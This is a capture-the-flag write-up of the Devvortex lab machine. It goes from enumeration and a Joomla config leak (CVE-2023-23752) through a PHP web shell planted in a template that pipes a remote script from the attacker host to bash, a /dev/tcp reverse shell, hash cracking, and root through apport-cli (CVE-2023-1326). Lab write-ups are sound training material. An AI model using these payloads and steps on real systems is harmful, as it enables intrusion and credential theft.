@@ -1,0 +1,182 @@
+Devvortex: Vulnerabilities: exposed sensitive files, subdomain enumeration,  CVE-2023-23752, RCE, CVE-2023-1326 
+
+
+Enumeration:
+nmap -sC -sV -p- --min-rate=1000 10.129.85.75
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devvortex.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+echo "10.129.85.75 devvortex.htb" | sudo tee -a /etc/hosts
+
+We see a simple website with static content
+
+gobuster dir -u http://devvortex.htb/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
+
+
+gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb/ --append-domain
+
+Using the subdomain vhost scan we found dev.devvortex.htb
+
+
+Burp Suite HTTP request:
+GET / HTTP/1.1
+Host: dev.devvortex.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Cookie: 1daf6e3366587cf9ab315f8ef3b5ed78=2e8h2g7ldev0gor79r1ubse70l
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+Let’s further enumerate directories here on dev.devvortex.htb
+
+echo "10.129.85.75 dev.devvortex.htb" | sudo tee -a /etc/hosts
+
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://dev.devvortex.htb/ -t 50
+
+We found http://dev.devvortex.htb/Administrator
+
+
+Burp suite request for login page:
+Joomla Administrator Login
+POST /administrator/index.php HTTP/1.1
+Host: dev.devvortex.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://dev.devvortex.htb/administrator/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 113
+Origin: http://dev.devvortex.htb
+DNT: 1
+Connection: close
+Cookie: 1daf6e3366587cf9ab315f8ef3b5ed78=7vvop6ksrcdu4i94ki0t2dfbju; 2e68b6f64dd33a8f15a059b5d8589d18=4ce4t3eoajjdurv96ola78hkkr
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+username=admin&passwd=password&option=com_login&task=login&return=aW5kZXgucGhw&84ba2070234b91f3323ec5238ab159a3=1
+
+By accessing: http://dev.devvortex.htb/administrator/manifests/files/joomla.xml , we can see that this gives us an http response that shows us the joomla service is running version 4.2.6
+
+Given the CVE:
+https://nvd.nist.gov/vuln/detail/CVE-2023-23752 
+Given an exploit for CVE:
+https://github.com/Pushkarup/CVE-2023-23752 
+
+$ curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
+
+The output gives us:
+"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##"
+ 
+
+We gained access to the joomla service now with lewis
+
+ System > Site Templates > Cassiopeia Details and Files then go to error.php and insert this code at the end of the file
+
+Instructs the system to go to our attack machine at 8080 port to grab malicious payload rev.sh
+
+<?php system("curl 10.10.14.206:8090/rev.sh|bash"); ?>
+
+This will make our rev.sh file to be grabbed and then give us a reverse shell. 
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.206/4444 0>&1' > rev.sh
+
+
+Host our web server to grab malicious payload & set up netcat to listen for reverse shell connection
+python3 -m http.server 8080
+nc -lnvp 4444
+
+Now send request to error.php which we modified to grab our reverse shell payload
+
+curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
+
+Now we are in as ww-data
+
+Look at any ports that might be listening locally. 
+ss -tlpn
+
+We see that ports 3306 and 33060 are listening locally, which are used by MySQL by default
+
+Upgrade shell and access sql database:
+script /dev/null -c bash
+mysql -u lewis -p
+show databases;
+use joomla;
+show tables;
+select * from sd4fg_users;
+
+This showed us information about logan with a hash of: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 
+
+
+hashid ‘$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12’
+
+Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+echo ‘$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12’ > hash
+
+hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt.gz 
+
+Mode 3200 deals with blowfish and bcrypt hashes
+
+Cracked:
+$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
+
+Let’s try the ssh server via logan now.
+
+We got in 
+
+ssh logan@10.129.229.146
+
+logan@devvortex:~$ cat user.txt
+211169a738528cd410b9356dac86c40e
+
+Privilege Escalation:
+
+logan@devvortex:/var/www/dev.devvortex.htb/administrator$ sudo -l
+sudo -l
+[sudo] password for logan: tequieromucho
+
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+
+
+
+logan@devvortex:/$ /usr/bin/apport-cli --version
+/usr/bin/apport-cli --version
+2.20.11
+
+We found a CVE:
+
+https://nvd.nist.gov/vuln/detail/CVE-2023-1326 
+
+ps -ux
+
+We will use the process ID ( PID ) of systemd , namely 1505.
+
+sudo /usr/bin/apport-cli -f -P 1505
+
+root@devvortex:~# cat root.txt
+cat root.txt
+2ae53933b0302437a9070e5382afc26a
+
+We have root access now.
